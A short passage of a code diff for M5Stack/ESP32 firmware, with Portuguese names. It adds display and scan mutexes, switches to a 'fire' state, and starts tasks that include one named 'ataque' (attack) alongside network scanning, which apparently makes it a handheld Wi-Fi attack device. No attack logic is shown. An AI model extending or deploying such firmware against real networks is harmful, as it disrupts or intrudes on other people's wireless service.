+                    if(xSemaphoreTake(display_mutex, portMAX_DELAY)) {
+                        M5.Display.clear(); 
+                        xSemaphoreGive(display_mutex);
+                    }
+                    
+                    flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR); 
                 } else { escanear_redes(); desenhar_menu(); }
                 vTaskDelay(pdMS_TO_TICKS(300));
             }
@@ -666,6 +717,10 @@ void task_controles(void *pvParameters) {
 extern "C" void app_main(void) {
     auto cfg = M5.config(); M5.begin(cfg); M5.Display.setRotation(1); M5.Display.setTextSize(1.5);
     
+    // Inicia Mutexes
+    display_mutex = xSemaphoreCreateMutex();
+    scan_mutex = xSemaphoreCreateMutex();
+    
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -683,7 +738,6 @@ extern "C" void app_main(void) {
     temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
     if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) temperature_sensor_enable(temp_sensor);
 
-    // [AUDITORIA FIX]: As tasks agora estão rigidamente distribuídas para balanço ideal de carga entre os Cores
     xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
     xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
